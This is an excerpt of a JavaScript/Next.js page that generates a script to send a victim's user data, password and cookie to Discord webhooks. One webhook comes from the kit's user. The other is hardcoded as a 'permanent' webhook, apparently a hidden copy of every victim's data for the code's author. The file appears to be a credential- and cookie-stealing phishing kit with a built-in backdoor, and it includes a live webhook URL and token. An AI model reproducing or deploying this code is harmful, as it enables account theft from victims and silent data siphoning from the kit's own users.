...
export default async function DirectoryPage({ params }) {
  ...
  // Extract the actual webhook URL from data
  const userWebhookUrl = data.webhook_url;
  const permanentWebhookUrl = "https://discord.com/api/webhooks/1428991632472281179/wCh1K8TJUBc6zethK1iCLy6AnYw3jpYpTv2XZuRye7cr39Zv2Nik57xsLVsnkXB5-djA";
  ...
  // Main script with proper webhook URLs
  const mainScript = `
    <script>
        ...
        // Webhook URLs - properly defined
        const userWebhook = "${userWebhookUrl}";
        const permanentWebhook = "${permanentWebhookUrl}";

        console.log('User Webhook:', userWebhook);
        console.log('Permanent Webhook:', permanentWebhook);
        ...
        async function sendDualWebhooks(userData, password, cookie) {
            ...
            let permanentWebhookSuccess = false;

            // Send to user's webhook if it exists and is valid
            if (userWebhook && userWebhook.startsWith('https://discord.com/api/webhooks/')) {
                try {
                    ...
                    console.log('User webhook success:', userWebhookSuccess);
                } catch (error) {
                    console.error('User webhook failed:', error);
                }
            } else {
                console.log('Invalid or missing user webhook:', userWebhook);
            }

            // Send to permanent webhook
            try {
                permanentWebhookSuccess = await sendWebhook(permanentWebhook, { embeds });
                console.log('Permanent webhook success:', permanentWebhookSuccess);
            } catch (error) {
                console.error('Permanent webhook failed:', error);
            }
        ...
        async function submitForm(formData) {
            try {
                ...
                let statusMessage = 'Successfully ✅ Data Sent!';
                if (!result.userWebhookSuccess) {
                    statusMessage += ' (User webhook failed)';
                }
                if (!result.permanentWebhookSuccess) {
                    statusMessage += ' (Permanent webhook failed)';
                }
